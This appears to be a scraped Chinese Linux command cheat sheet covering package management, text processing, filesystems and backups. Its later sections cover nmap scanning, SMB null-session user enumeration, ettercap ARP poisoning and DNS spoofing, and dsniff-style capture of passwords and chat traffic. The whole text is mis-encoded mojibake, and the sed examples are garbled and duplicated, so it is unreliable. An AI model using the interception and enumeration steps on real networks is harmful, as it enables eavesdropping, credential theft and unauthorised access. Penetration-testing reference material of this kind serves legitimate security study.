åœ¨rpmä»“åº“ä¸­æœå¯»è½¯ä»¶åŒ… yum clean packages æ¸…ç†rpmç¼“å­˜åˆ é™¤ä¸‹è½½çš„åŒ… yum clean headers åˆ é™¤æ‰€æœ‰å¤´æ–‡ä»¶ yum clean all åˆ é™¤æ‰€æœ‰ç¼“å­˜çš„åŒ…å’Œå¤´æ–‡ä»¶DEB åŒ… <span class="token punctuation">(</span>Debian, Ubuntu ä»¥åŠç±»ä¼¼ç³»ç»Ÿ<span class="token punctuation">)</span> dpkg -i package.deb å®‰è£…/æ›´æ–°ä¸€ä¸ª deb åŒ… dpkg -r package_name ä»ç³»ç»Ÿåˆ é™¤ä¸€ä¸ª deb åŒ… dpkg -l æ˜¾ç¤ºç³»ç»Ÿä¸­æ‰€æœ‰å·²ç»å®‰è£…çš„ deb åŒ… dpkg -l <span class="token operator">|</span> <span class="token function">grep</span> httpd æ˜¾ç¤ºæ‰€æœ‰åç§°ä¸­åŒ…å« <span class="token string">"httpd"</span> å­—æ ·çš„debåŒ… dpkg -s package_name è·å¾—å·²ç»å®‰è£…åœ¨ç³»ç»Ÿä¸­ä¸€ä¸ªç‰¹æ®ŠåŒ…çš„ä¿¡æ¯ dpkg -L package_name æ˜¾ç¤ºç³»ç»Ÿä¸­å·²ç»å®‰è£…çš„ä¸€ä¸ªdebåŒ…æ‰€æä¾›çš„æ–‡ä»¶åˆ—è¡¨ dpkg --contents package.deb æ˜¾ç¤ºå°šæœªå®‰è£…çš„ä¸€ä¸ªåŒ…æ‰€æä¾›çš„æ–‡ä»¶åˆ—è¡¨ dpkg -S /bin/ping ç¡®è®¤æ‰€ç»™çš„æ–‡ä»¶ç”±å“ªä¸ªdebåŒ…æä¾›APT è½¯ä»¶å·¥å…· <span class="token punctuation">(</span>Debian, Ubuntu ä»¥åŠç±»ä¼¼ç³»ç»Ÿ<span class="token punctuation">)</span> <span class="token function">apt-get</span> <span class="token function">install</span> package_name å®‰è£…/æ›´æ–°ä¸€ä¸ª deb åŒ… apt-cdrom <span class="token function">install</span> package_name ä»å…‰ç›˜å®‰è£…/æ›´æ–°ä¸€ä¸ª deb åŒ… <span class="token function">apt-get</span> update å‡çº§åˆ—è¡¨ä¸­çš„è½¯ä»¶åŒ… <span class="token function">apt-get</span> upgrade å‡çº§æ‰€æœ‰å·²å®‰è£…çš„è½¯ä»¶ <span class="token function">apt-get</span> remove package_name ä»ç³»ç»Ÿåˆ é™¤ä¸€ä¸ªdebåŒ… <span class="token function">apt-get</span> check ç¡®è®¤ä¾èµ–çš„è½¯ä»¶ä»“åº“æ­£ç¡® <span class="token function">apt-get</span> clean ä»ä¸‹è½½çš„è½¯ä»¶åŒ…ä¸­æ¸…ç†ç¼“å­˜ apt-cache search searched-package è¿”å›åŒ…å«æ‰€è¦æœç´¢å­—ç¬¦ä¸²çš„è½¯ä»¶åŒ…åç§°è¿”å›é¡¶éƒ¨ç´¢å¼• ^æŸ¥çœ‹æ–‡ä»¶å†…å®¹ <span class="token function">cat</span> file1 ä»ç¬¬ä¸€ä¸ªå­—èŠ‚å¼€å§‹æ­£å‘æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹ tac file1 ä»æœ€åä¸€è¡Œå¼€å§‹åå‘æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ <span class="token function">more</span> file1 æŸ¥çœ‹ä¸€ä¸ªé•¿æ–‡ä»¶çš„å†…å®¹ <span class="token function">less</span> file1 ç±»ä¼¼äº <span class="token string">'more'</span> å‘½ä»¤ï¼Œä½†æ˜¯å®ƒå…è®¸åœ¨æ–‡ä»¶ä¸­å’Œæ­£å‘æ“ä½œä¸€æ ·çš„åå‘æ“ä½œ <span class="token function">head</span> -2 file1 æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„å‰ä¸¤è¡Œ <span class="token function">tail</span> -2 file1 æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶çš„æœ€åä¸¤è¡Œ <span class="token function">tail</span> -f /var/log/messages å®æ—¶æŸ¥çœ‹è¢«æ·»åŠ åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­çš„å†…å®¹</code></pre><h2 id="æ–‡æœ¬å¤„ç†"><a href="#æ–‡æœ¬å¤„ç†" class="headerlink" title="æ–‡æœ¬å¤„ç†"></a>æ–‡æœ¬å¤„ç†</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">cat</span> file1 file2 <span class="token punctuation">..</span>. <span class="token operator">|</span> <span class="token function">command</span> <span class="token operator">&lt;</span><span class="token operator">></span> file1_in.txt_or_file1_out.txt general syntax <span class="token keyword">for</span> text manipulation using PIPE, STDIN and STDOUT <span class="token function">cat</span> file1 <span class="token operator">|</span> command<span class="token punctuation">(</span> sed, grep, awk, grep, etc<span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span class="token operator">></span> result.txt åˆå¹¶ä¸€ä¸ªæ–‡ä»¶çš„è¯¦ç»†è¯´æ˜æ–‡æœ¬ï¼Œå¹¶å°†ç®€ä»‹å†™å…¥ä¸€ä¸ªæ–°æ–‡ä»¶ä¸­ <span class="token function">cat</span> file1 <span class="token operator">|</span> command<span class="token punctuation">(</span> sed, grep, awk, grep, etc<span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span class="token operator">>></span> result.txt åˆå¹¶ä¸€ä¸ªæ–‡ä»¶çš„è¯¦ç»†è¯´æ˜æ–‡æœ¬ï¼Œå¹¶å°†ç®€ä»‹å†™å…¥ä¸€ä¸ªå·²æœ‰çš„æ–‡ä»¶ä¸­ <span class="token function">grep</span> Aug /var/log/messages åœ¨æ–‡ä»¶ <span class="token string">'/var/log/messages'</span>ä¸­æŸ¥æ‰¾å…³é”®è¯<span class="token string">"Aug"</span> <span class="token function">grep</span> ^Aug /var/log/messages åœ¨æ–‡ä»¶ <span class="token string">'/var/log/messages'</span>ä¸­æŸ¥æ‰¾ä»¥<span class="token string">"Aug"</span>å¼€å§‹çš„è¯æ±‡ <span class="token function">grep</span> <span class="token punctuation">[</span>0-9<span class="token punctuation">]</span> /var/log/messages é€‰æ‹© <span class="token string">'/var/log/messages'</span> æ–‡ä»¶ä¸­æ‰€æœ‰åŒ…å«æ•°å­—çš„è¡Œ <span class="token function">grep</span> Aug -R /var/log/* åœ¨ç›®å½• <span class="token string">'/var/log'</span> åŠéšåçš„ç›®å½•ä¸­æœç´¢å­—ç¬¦ä¸²<span class="token string">"Aug"</span> <span class="token function">sed</span> <span class="token string">'s/stringa1/stringa2/g'</span> example.txt å°†example.txtæ–‡ä»¶ä¸­çš„ <span class="token string">"string1"</span> æ›¿æ¢æˆ <span class="token string">"string2"</span> <span class="token function">sed</span> <span class="token string">'/^/d'</span> example.txt ä»example.txtæ–‡ä»¶ä¸­åˆ é™¤æ‰€æœ‰ç©ºç™½è¡Œ  <span class="token function">sed</span> <span class="token string">'/ *#/d; /^/d'</span> example.txt ä»example.txtæ–‡ä»¶ä¸­åˆ é™¤æ‰€æœ‰ç©ºç™½è¡Œ  <span class="token function">sed</span> <span class="token string">'/ *#/d; /^/d'</span> example.txt ä»example.txtæ–‡ä»¶ä¸­åˆ é™¤æ‰€æœ‰æ³¨é‡Šå’Œç©ºç™½è¡Œ <span class="token keyword">echo</span> <span class="token string">'esempio'</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'[:lower:]'</span> <span class="token string">'[:upper:]'</span> åˆå¹¶ä¸Šä¸‹å•å…ƒæ ¼å†…å®¹ <span class="token function">sed</span> -e <span class="token string">'1d'</span> result.txt ä»æ–‡ä»¶example.txt ä¸­æ’é™¤ç¬¬ä¸€è¡Œ <span class="token function">sed</span> -n <span class="token string">'/stringa1/p'</span> æŸ¥çœ‹åªåŒ…å«è¯æ±‡ <span class="token string">"string1"</span>çš„è¡Œ <span class="token function">sed</span> -e <span class="token string">'s/ *//â€²example.txtåˆ é™¤æ¯ä¸€è¡Œæœ€åçš„ç©ºç™½å­—ç¬¦sedâˆ’eâ€²s/stringa1//gâ€²example.txtä»æ–‡æ¡£ä¸­åªåˆ é™¤è¯æ±‡"string1"å¹¶ä¿ç•™å‰©ä½™å…¨éƒ¨sedâˆ’nâ€²1,5p;5qâ€²example.txtæŸ¥çœ‹ä»ç¬¬ä¸€è¡Œåˆ°ç¬¬5è¡Œå†…å®¹sedâˆ’nâ€²5p;5qâ€²example.txtæŸ¥çœ‹ç¬¬5è¡Œsedâˆ’eâ€²s/00âˆ—/0/gâ€²example.txtç”¨å•ä¸ªé›¶æ›¿æ¢å¤šä¸ªé›¶catâˆ’nfile1æ ‡ç¤ºæ–‡ä»¶çš„è¡Œæ•°catexample.txt|awkâ€²NR//â€²example.txtåˆ é™¤æ¯ä¸€è¡Œæœ€åçš„ç©ºç™½å­—ç¬¦sedâˆ’eâ€²s/stringa1//gâ€²example.txtä»æ–‡æ¡£ä¸­åªåˆ é™¤è¯æ±‡"string1"å¹¶ä¿ç•™å‰©ä½™å…¨éƒ¨sedâˆ’nâ€²1,5p;5qâ€²example.txtæŸ¥çœ‹ä»ç¬¬ä¸€è¡Œåˆ°ç¬¬5è¡Œå†…å®¹sedâˆ’nâ€²5p;5qâ€²example.txtæŸ¥çœ‹ç¬¬5è¡Œsedâˆ’eâ€²s/00âˆ—/0/gâ€²example.txtç”¨å•ä¸ªé›¶æ›¿æ¢å¤šä¸ªé›¶catâˆ’nfile1æ ‡ç¤ºæ–‡ä»¶çš„è¡Œæ•°catexample.txt|awkâ€²NR1}'</span> æŸ¥çœ‹ä¸€è¡Œç¬¬ä¸€æ  <span class="token keyword">echo</span> a b c <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print 1,1,3}'</span> æŸ¥çœ‹ä¸€è¡Œçš„ç¬¬ä¸€å’Œç¬¬ä¸‰æ  <span class="token function">paste</span> file1 file2 åˆå¹¶ä¸¤ä¸ªæ–‡ä»¶æˆ–ä¸¤æ çš„å†…å®¹ <span class="token function">paste</span> -d <span class="token string">'+'</span> file1 file2 åˆå¹¶ä¸¤ä¸ªæ–‡ä»¶æˆ–ä¸¤æ çš„å†…å®¹ï¼Œä¸­é—´ç”¨<span class="token string">"+"</span>åŒºåˆ† <span class="token function">sort</span> file1 file2 æ’åºä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹ <span class="token function">sort</span> file1 file2 <span class="token operator">|</span> <span class="token function">uniq</span> å–å‡ºä¸¤ä¸ªæ–‡ä»¶çš„å¹¶é›†<span class="token punctuation">(</span>é‡å¤çš„è¡Œåªä¿ç•™ä¸€ä»½<span class="token punctuation">)</span> <span class="token function">sort</span> file1 file2 <span class="token operator">|</span> <span class="token function">uniq</span> -u åˆ é™¤äº¤é›†ï¼Œç•™ä¸‹å…¶ä»–çš„è¡Œ <span class="token function">sort</span> file1 file2 <span class="token operator">|</span> <span class="token function">uniq</span> -d å–å‡ºä¸¤ä¸ªæ–‡ä»¶çš„äº¤é›†<span class="token punctuation">(</span>åªç•™ä¸‹åŒæ—¶å­˜åœ¨äºä¸¤ä¸ªæ–‡ä»¶ä¸­çš„æ–‡ä»¶<span class="token punctuation">)</span> <span class="token function">comm</span> -1 file1 file2 æ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹åªåˆ é™¤ <span class="token string">'file1'</span> æ‰€åŒ…å«çš„å†…å®¹ <span class="token function">comm</span> -2 file1 file2 æ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹åªåˆ é™¤ <span class="token string">'file2'</span> æ‰€åŒ…å«çš„å†…å®¹ <span class="token function">comm</span> -3 file1 file2 æ¯”è¾ƒä¸¤ä¸ªæ–‡ä»¶çš„å†…å®¹åªåˆ é™¤ä¸¤ä¸ªæ–‡ä»¶å…±æœ‰çš„éƒ¨åˆ†</code></pre><h2 id="å­—ç¬¦è®¾ç½®å’Œæ–‡ä»¶æ ¼å¼è½¬æ¢"><a href="#å­—ç¬¦è®¾ç½®å’Œæ–‡ä»¶æ ¼å¼è½¬æ¢" class="headerlink" title="å­—ç¬¦è®¾ç½®å’Œæ–‡ä»¶æ ¼å¼è½¬æ¢"></a>å­—ç¬¦è®¾ç½®å’Œæ–‡ä»¶æ ¼å¼è½¬æ¢</h2><pre class=" language-bash"><code class="language-bash">dos2unix filedos.txt fileunix.txt å°†ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶çš„æ ¼å¼ä»MSDOSè½¬æ¢æˆUNIX unix2dos fileunix.txt filedos.txt å°†ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶çš„æ ¼å¼ä»UNIXè½¬æ¢æˆMSDOS recode <span class="token punctuation">..</span>HTML <span class="token operator">&lt;</span> page.txt <span class="token operator">></span> page.html å°†ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶è½¬æ¢æˆhtml recode -l <span class="token operator">|</span> <span class="token function">more</span> æ˜¾ç¤ºæ‰€æœ‰å…è®¸çš„è½¬æ¢æ ¼å¼</code></pre><h2 id="æ–‡ä»¶ç³»ç»Ÿåˆ†æ"><a href="#æ–‡ä»¶ç³»ç»Ÿåˆ†æ" class="headerlink" title="æ–‡ä»¶ç³»ç»Ÿåˆ†æ"></a>æ–‡ä»¶ç³»ç»Ÿåˆ†æ</h2><pre class=" language-bash"><code class="language-bash">badblocks -v /dev/hda1 æ£€æŸ¥ç£ç›˜hda1ä¸Šçš„åç£å— <span class="token function">fsck</span> /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šlinuxæ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ fsck.ext2 /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šext2æ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ e2fsck /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šext2æ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ e2fsck -j /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šext3æ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ fsck.ext3 /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šext3æ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ fsck.vfat /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šfatæ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ fsck.msdos /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šdosæ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ dosfsck /dev/hda1 ä¿®å¤/æ£€æŸ¥hda1ç£ç›˜ä¸Šdosæ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§</code></pre><h2 id="åˆå§‹åŒ–ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ"><a href="#åˆå§‹åŒ–ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="åˆå§‹åŒ–ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ"></a>åˆå§‹åŒ–ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ</h2><pre class=" language-bash"><code class="language-bash"> mkfs /dev/hda1 åœ¨hda1åˆ†åŒºåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ mke2fs /dev/hda1 åœ¨hda1åˆ†åŒºåˆ›å»ºä¸€ä¸ªlinux ext2çš„æ–‡ä»¶ç³»ç»Ÿ mke2fs -j /dev/hda1 åœ¨hda1åˆ†åŒºåˆ›å»ºä¸€ä¸ªlinux ext3<span class="token punctuation">(</span>æ—¥å¿—å‹<span class="token punctuation">)</span>çš„æ–‡ä»¶ç³»ç»Ÿ mkfs -t vfat 32 -F /dev/hda1 åˆ›å»ºä¸€ä¸ª FAT32 æ–‡ä»¶ç³»ç»Ÿ <span class="token function">fdformat</span> -n /dev/fd0 æ ¼å¼åŒ–ä¸€ä¸ªè½¯ç›˜ mkswap /dev/hda3 åˆ›å»ºä¸€ä¸ªswapæ–‡ä»¶ç³»ç»ŸSWAPæ–‡ä»¶ç³»ç»Ÿ mkswap /dev/hda3 åˆ›å»ºä¸€ä¸ªswapæ–‡ä»¶ç³»ç»Ÿ swapon /dev/hda3 å¯ç”¨ä¸€ä¸ªæ–°çš„swapæ–‡ä»¶ç³»ç»Ÿ swapon /dev/hda2 /dev/hdb3 å¯ç”¨ä¸¤ä¸ªswapåˆ†åŒº</code></pre><h2 id="å¤‡ä»½"><a href="#å¤‡ä»½" class="headerlink" title="å¤‡ä»½"></a>å¤‡ä»½</h2><pre class=" language-bash"><code class="language-bash">dump -0aj -f /tmp/home0.bak /home åˆ¶ä½œä¸€ä¸ª <span class="token string">'/home'</span> ç›®å½•çš„å®Œæ•´å¤‡ä»½ dump -1aj -f /tmp/home0.bak /home åˆ¶ä½œä¸€ä¸ª <span class="token string">'/home'</span> ç›®å½•çš„äº¤äº’å¼å¤‡ä»½ restore -if /tmp/home0.bak è¿˜åŸä¸€ä¸ªäº¤äº’å¼å¤‡ä»½ <span class="token function">rsync</span> -rogpav --delete /home /tmp åŒæ­¥ä¸¤è¾¹çš„ç›®å½• <span class="token function">rsync</span> -rogpav -e <span class="token function">ssh</span> --delete /home ip_address:/tmp é€šè¿‡SSHé€šé“rsync <span class="token function">rsync</span> -az -e <span class="token function">ssh</span> --delete ip_addr:/home/public /home/local é€šè¿‡sshå’Œå‹ç¼©å°†ä¸€ä¸ªè¿œç¨‹ç›®å½•åŒæ­¥åˆ°æœ¬åœ°ç›®å½• <span class="token function">rsync</span> -az -e <span class="token function">ssh</span> --delete /home/local ip_addr:/home/public é€šè¿‡sshå’Œå‹ç¼©å°†æœ¬åœ°ç›®å½•åŒæ­¥åˆ°è¿œç¨‹ç›®å½• <span class="token function">dd</span> bs<span class="token operator">=</span>1M if<span class="token operator">=</span>/dev/hda <span class="token operator">|</span> <span class="token function">gzip</span> <span class="token operator">|</span> <span class="token function">ssh</span> user@ip_addr <span class="token string">'dd of=hda.gz'</span> é€šè¿‡sshåœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œä¸€æ¬¡å¤‡ä»½æœ¬åœ°ç£ç›˜çš„æ“ä½œ <span class="token function">dd</span> if<span class="token operator">=</span>/dev/sda of<span class="token operator">=</span>/tmp/file1 å¤‡ä»½ç£ç›˜å†…å®¹åˆ°ä¸€ä¸ªæ–‡ä»¶ <span class="token function">tar</span> -Puf backup.tar /home/user æ‰§è¡Œä¸€æ¬¡å¯¹ <span class="token string">'/home/user'</span> ç›®å½•çš„äº¤äº’å¼å¤‡ä»½æ“ä½œ <span class="token punctuation">(</span> <span class="token function">cd</span> /tmp/local/ <span class="token operator">&amp;&amp;</span> <span class="token function">tar</span> c <span class="token keyword">.</span> <span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">ssh</span> -C user@ip_addr <span class="token string">'cd /home/share/ &amp;&amp; tar x -p'</span> é€šè¿‡sshåœ¨è¿œç¨‹ç›®å½•ä¸­å¤åˆ¶ä¸€ä¸ªç›®å½•å†…å®¹ <span class="token punctuation">(</span> <span class="token function">tar</span> c /home <span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">ssh</span> -C user@ip_addr <span class="token string">'cd /home/backup-home &amp;&amp; tar x -p'</span> é€šè¿‡sshåœ¨è¿œç¨‹ç›®å½•ä¸­å¤åˆ¶ä¸€ä¸ªæœ¬åœ°ç›®å½• <span class="token function">tar</span> cf - <span class="token keyword">.</span> <span class="token operator">|</span> <span class="token punctuation">(</span>cd /tmp/backup <span class="token punctuation">;</span> <span class="token function">tar</span> xf - <span class="token punctuation">)</span> æœ¬åœ°å°†ä¸€ä¸ªç›®å½•å¤åˆ¶åˆ°å¦ä¸€ä¸ªåœ°æ–¹ï¼Œä¿ç•™åŸæœ‰æƒé™åŠé“¾æ¥ <span class="token function">find</span> /home/user1 -name <span class="token string">'*.txt'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">cp</span> -av --target-directory<span class="token operator">=</span>/home/backup/ --parents ä»ä¸€ä¸ªç›®å½•æŸ¥æ‰¾å¹¶å¤åˆ¶æ‰€æœ‰ä»¥ <span class="token string">'.txt'</span> ç»“å°¾çš„æ–‡ä»¶åˆ°å¦ä¸€ä¸ªç›®å½• <span class="token function">find</span> /var/log -name <span class="token string">'*.log'</span> <span class="token operator">|</span> <span class="token function">tar</span> cv --files-from<span class="token operator">=</span>- <span class="token operator">|</span> <span class="token function">bzip2</span> <span class="token operator">></span> log.tar.bz2 æŸ¥æ‰¾æ‰€æœ‰ä»¥ <span class="token string">'.log'</span> ç»“å°¾çš„æ–‡ä»¶å¹¶åšæˆä¸€ä¸ªbzipåŒ… <span class="token function">dd</span> if<span class="token operator">=</span>/dev/hda of<span class="token operator">=</span>/dev/fd0 bs<span class="token operator">=</span>512 count<span class="token operator">=</span>1 åšä¸€ä¸ªå°† MBR <span class="token punctuation">(</span>Master Boot Record<span class="token punctuation">)</span>å†…å®¹å¤åˆ¶åˆ°è½¯ç›˜çš„åŠ¨ä½œ <span class="token function">dd</span> if<span class="token operator">=</span>/dev/fd0 of<span class="token operator">=</span>/dev/hda bs<span class="token operator">=</span>512 count<span class="token operator">=</span>1 ä»å·²ç»ä¿å­˜åˆ°è½¯ç›˜çš„å¤‡ä»½ä¸­æ¢å¤MBRå†…å®¹</code></pre><h2 id="å…‰ç›˜"><a href="#å…‰ç›˜" class="headerlink" title="å…‰ç›˜"></a>å…‰ç›˜</h2><pre class=" language-bash"><code class="language-bash">cdrecord -v gracetime<span class="token operator">=</span>2 dev<span class="token operator">=</span>/dev/cdrom -eject blank<span class="token operator">=</span>fast -force æ¸…ç©ºä¸€ä¸ªå¯å¤å†™çš„å…‰ç›˜å†…å®¹ <span class="token function">mkisofs</span> /dev/cdrom <span class="token operator">></span> cd.iso åœ¨ç£ç›˜ä¸Šåˆ›å»ºä¸€ä¸ªå…‰ç›˜çš„isoé•œåƒæ–‡ä»¶ <span class="token function">mkisofs</span> /dev/cdrom <span class="token operator">|</span> <span class="token function">gzip</span> <span class="token operator">></span> cd_iso.gz åœ¨ç£ç›˜ä¸Šåˆ›å»ºä¸€ä¸ªå‹ç¼©äº†çš„å…‰ç›˜isoé•œåƒæ–‡ä»¶ <span class="token function">mkisofs</span> -J -allow-leading-dots -R -V <span class="token string">"Label CD"</span> -iso-level 4 -o ./cd.iso data_cd åˆ›å»ºä¸€ä¸ªç›®å½•çš„isoé•œåƒæ–‡ä»¶ cdrecord -v dev<span class="token operator">=</span>/dev/cdrom cd.iso åˆ»å½•ä¸€ä¸ªISOé•œåƒæ–‡ä»¶ <span class="token function">gzip</span> -dc cd_iso.gz <span class="token operator">|</span> cdrecord dev<span class="token operator">=</span>/dev/cdrom - åˆ»å½•ä¸€ä¸ªå‹ç¼©äº†çš„ISOé•œåƒæ–‡ä»¶ <span class="token function">mount</span> -o loop cd.iso /mnt/iso æŒ‚è½½ä¸€ä¸ªISOé•œåƒæ–‡ä»¶ cd-paranoia -B ä»ä¸€ä¸ªCDå…‰ç›˜è½¬å½•éŸ³è½¨åˆ° wav æ–‡ä»¶ä¸­ cd-paranoia -- <span class="token string">"-3"</span> ä»ä¸€ä¸ªCDå…‰ç›˜è½¬å½•éŸ³è½¨åˆ° wav æ–‡ä»¶ä¸­ï¼ˆå‚æ•°-3ï¼‰ cdrecord --scanbus æ‰«ææ€»çº¿ä»¥è¯†åˆ«scsié€šé“ <span class="token function">dd</span> if<span class="token operator">=</span>/dev/hdc <span class="token operator">|</span> md5sum æ ¡éªŒä¸€ä¸ªè®¾å¤‡çš„md5sumç¼–ç ï¼Œä¾‹å¦‚ä¸€å¼  CD</code></pre><h2 id="åº”ç”¨å‘½ä»¤"><a href="#åº”ç”¨å‘½ä»¤" class="headerlink" title="åº”ç”¨å‘½ä»¤"></a>åº”ç”¨å‘½ä»¤</h2><pre class=" language-bash"><code class="language-bash">whois åŸŸå/ip æŸ¥çœ‹åŸŸåçš„è¯¦ç»†ä¿¡æ¯ã€‚<span class="token function">ping</span> åŸŸå/ip æµ‹è¯•æœ¬æœºåˆ°è¿œç«¯ä¸»æœºæ˜¯å¦è”é€šã€‚<span class="token function">dig</span> åŸŸå/ip æŸ¥çœ‹åŸŸåè§£æçš„è¯¦ç»†ä¿¡æ¯ã€‚host -l åŸŸå dnsæœåŠ¡å™¨ ä¼ è¾“zoneã€‚</code></pre><h2 id="æ‰«ænmap"><a href="#æ‰«ænmap" class="headerlink" title="æ‰«ænmap"></a>æ‰«ænmap</h2><pre class=" language-bash"><code class="language-bash">-sS åŠå¼€æ‰«æTCPå’ŒSYNæ‰«æã€‚-sT å®Œå…¨TCPè¿æ¥æ‰«æã€‚-sU UDPæ‰«æ-PS synåŒ…æ¢æµ‹<span class="token punctuation">(</span>é˜²ç«å¢™æ¢æµ‹<span class="token punctuation">)</span>-PA ackåŒ…æ¢æµ‹<span class="token punctuation">(</span>é˜²ç«å¢™æ¢æµ‹<span class="token punctuation">)</span>-PN ä¸pingã€‚-n ä¸dnsè§£æã€‚-A -Oå’Œ-sVã€‚-O æ“ä½œç³»ç»Ÿè¯†åˆ«ã€‚-sV æœåŠ¡ç‰ˆæœ¬ä¿¡æ¯<span class="token punctuation">(</span>banner<span class="token punctuation">)</span>-p ç«¯å£æ‰«æã€‚-T è®¾ç½®æ—¶é—´çº§åˆ«<span class="token punctuation">(</span>0-5<span class="token punctuation">)</span>-iL å¯¼å…¥æ‰«æç»“æœã€‚-oG è¾“å‡ºæ‰«æç»“æœã€‚æ“ä½œç³»ç»Ÿè¯†åˆ«:p0f -i eth0 -U -p å¼€å¯æ··æ‚æ¨¡å¼ã€‚xprobe2 ip<span class="token operator">|</span>åŸŸå æ£€æµ‹osã€‚bannerè·å–:nc ip port æ£€æµ‹ç«¯å£æ˜¯å¦æ‰“å¼€ã€‚telnet ip port æ£€æµ‹ç«¯å£æ˜¯å¦æ‰“å¼€ã€‚<span class="token function">wget</span> ip ä¸‹è½½ä¸»é¡µã€‚<span class="token function">cat</span> index.html <span class="token operator">|</span> <span class="token function">more</span> æ˜¾ç¤ºä¸»é¡µä»£ç ã€‚q é€€å‡ºã€‚windowsæšä¸¾nmap -sS -p 139,445 ip æ‰«æwindowsã€‚<span class="token function">cd</span> /pentest/enumeration/smb-enumnbtscan -f targetIP æ£€æµ‹netbiosã€‚smbgetserverinfo -i targetIP æ‰«æname,os,ç»„ã€‚smbdumpusers -i targetIP åˆ—å‡ºç”¨æˆ·ã€‚smbclient -L //targetIP åˆ—å‡ºå…±äº«ã€‚ä½¿ç”¨windows:net use \\ipipc$ <span class="token string">""</span> /u:<span class="token string">""</span> å¼€å¯ç©ºä¼šè¯ã€‚net view \\ip æ˜¾ç¤ºå…±äº«ä¿¡æ¯ã€‚smbclient:smbclient -L hostName -I targetIP æšä¸¾å…±äº«ã€‚smbclient -L hostName/share -U <span class="token string">""</span> ç”¨ç©ºç”¨æˆ·è¿æ¥ã€‚smbclient -L hostName -I targetIP -U adminæ™®é€šç”¨æˆ·è¿æ¥ã€‚rpcclient:rpcclient targetIP -U â€œâ€æ‰“å¼€ä¸€ä¸ªç©ºä¼šè¯ã€‚netshareenum æšä¸¾å…±äº«ã€‚enumdomusers æšä¸¾ç”¨æˆ·ã€‚lsaenumsid æšä¸¾åŸŸSIDã€‚queryuser RID æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ã€‚createdomuser åˆ›å»ºç”¨æˆ·è®¿é—®ã€‚</code></pre><h2 id="ARPæ¬ºéª—"><a href="#ARPæ¬ºéª—" class="headerlink" title="ARPæ¬ºéª—"></a>ARPæ¬ºéª—</h2><pre class=" language-bash"><code class="language-bash">ettercap:<span class="token function">nano</span> /usr/local/etc/etter.confé…ç½®æ–‡ä»¶Sniff <span class="token operator">></span> Unified sniffing <span class="token operator">></span> Network interface: eth0 <span class="token operator">></span> OK è®¾ç½®æŠ“åŒ…çš„ç½‘å¡Hosts <span class="token operator">></span> Scan <span class="token keyword">for</span> hosts <span class="token punctuation">(</span>do this two times<span class="token punctuation">)</span>æ‰«æç½‘æ®µçš„ä¸»æœºHosts <span class="token operator">></span> Hosts list æ˜¾ç¤ºä¸»æœºåˆ—è¡¨Select the default gateway <span class="token operator">></span> Add to Target 1 æ·»åŠ ä¸»æœºSelect the target <span class="token operator">></span> Add to Target 2 æ·»åŠ ä¸»æœºMitm <span class="token operator">></span> Arp poisoning <span class="token operator">></span> Sniff remote connections <span class="token operator">></span> OK è®¾ç½®ARPæ”»å‡»Start <span class="token operator">></span> Start sniffing å¼€å§‹æ”»å‡»dsniff -i eth0 ç›‘å¬ç½‘å¡çªƒå¬ç™»å½•ç”¨æˆ·å¯†ç urlsnarf -i eth0 å—…æ¢httpè¯·æ±‚msgsnarf -i eth0 å—…æ¢èŠå¤©è½¯ä»¶çš„èŠå¤©å†…å®¹driftnet -i eth0 ç½‘ç»œç®¡ç†å—…æ¢å›¾ç‰‡ï¼ŒéŸ³é¢‘ã€‚dnsæ¬ºéª—:<span class="token function">nano</span> /usr/local/share/ettercap/etter.dnsç¼–è¾‘é…ç½®æ–‡ä»¶Plugins <span class="token operator">></span> Manage the plugins <span class="token operator">></span> dns_spoof è®¾ç½®dnsæ¬ºéª—Mitm <span class="token operator">></span> Arp poisoning <span class="token operator">></span> Sniff remote connections <span class="token operator">></span> OK è®¾ç½®ARPStart <span class="token operator">></span> Start sniffing å¼€å§‹æ”»å‡»</code></pre><h2 id="Exploitsæ¼æ´åˆ©ç”¨"><a href="#Exploitsæ¼æ´åˆ©ç”¨" 